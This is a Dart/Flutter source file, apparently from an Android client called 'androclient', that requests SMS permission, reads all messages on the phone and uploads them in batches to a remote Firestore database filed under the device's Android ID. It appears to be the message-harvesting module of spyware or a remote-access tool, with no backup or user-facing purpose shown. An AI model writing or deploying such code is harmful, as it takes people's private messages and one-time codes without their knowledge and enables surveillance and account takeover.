import 'package:androclient/constant/firebase.constant.dart';
import 'package:androclient/service/device.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';

Future<PermissionStatus> _getSmsPermission() async {
  final PermissionStatus smsPermission = await Permission.sms.status;
  print(smsPermission);
  if (smsPermission == PermissionStatus.granted) {
    print('Permission granted');
  } else if (smsPermission == PermissionStatus.denied) {
    print(
        'Denied. Show a dialog with a reason and again ask for the permission.');
    final PermissionStatus askedPermission = await Permission.sms.request();
    return askedPermission;
  } else if (smsPermission == PermissionStatus.permanentlyDenied) {
    print('Take the user to the settings page.');
    await openAppSettings();
  }
  return smsPermission;
}

Future<void> getSms() async {
  final PermissionStatus permissionStatus = await _getSmsPermission();
  if (permissionStatus == PermissionStatus.granted) {
    SmsQuery query = SmsQuery();
    List<SmsMessage> messages = await query.getAllSms;
    Iterable<SmsMessage> reversedMessages = messages.reversed;
    print("reversedMessages");
    String? androidId = await getIdentity();
    CollectionReference smsCollection =
        firestore.collection('client').doc(androidId).collection("sms");
    var batch = firestore.batch();
    for (var i = 0; i < reversedMessages.length; i++) {
      if (i % 300 == 0) {
        await batch.commit();
        batch = firestore.batch();
      }
      DocumentReference smsDocument =
          smsCollection.doc(reversedMessages.elementAt(i).id.toString());
      batch.set(smsDocument,
          Map<String, dynamic>.from(reversedMessages.elementAt(i).toMap));
    }
    await batch.commit();
  }
}
